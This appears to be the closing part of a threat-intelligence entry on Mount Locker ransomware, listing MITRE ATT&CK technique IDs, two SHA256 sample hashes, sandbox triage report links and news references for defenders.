[T1112](https://attack.mitre.org/techniques/T1112/)

[T1490](https://attack.mitre.org/techniques/T1490/)

[T1059.001](https://attack.mitre.org/techniques/T1059/001/)

[T1489](https://attack.mitre.org/techniques/T1489/) 

[T1562.001](https://attack.mitre.org/techniques/T1562/001/)

[T1106](https://attack.mitre.org/techniques/T1106/)

[T1486](https://attack.mitre.org/techniques/T1486/)

[T1070.004](https://attack.mitre.org/techniques/T1070/004/)

**Hashes SHA256**

```
226a723ffb4a91d9950a8b266167c5b354ab0db1dc225578494917fe53867ef2
e7c277aae66085f1e0c4789fe51cac50e3ea86d79c8a242ffc066ed0b0548037
```

### Triage reports

* [https://tria.ge/201122-a14ms1r5dj/behavioral1](https://tria.ge/201122-a14ms1r5dj/behavioral1)
* [https://tria.ge/201122-8zgjp3syg6/behavioral1](https://tria.ge/201122-8zgjp3syg6/behavioral1)

### References

* [https://twitter.com/Arkbird_SOLG/status/1330306444332326919](https://twitter.com/Arkbird_SOLG/status/1330306444332326919)
* [https://www.bleepingcomputer.com/news/security/mount-locker-ransomware-joins-the-multi-million-dollar-ransom-game/](https://www.bleepingcomputer.com/news/security/mount-locker-ransomware-joins-the-multi-million-dollar-ransom-game/)
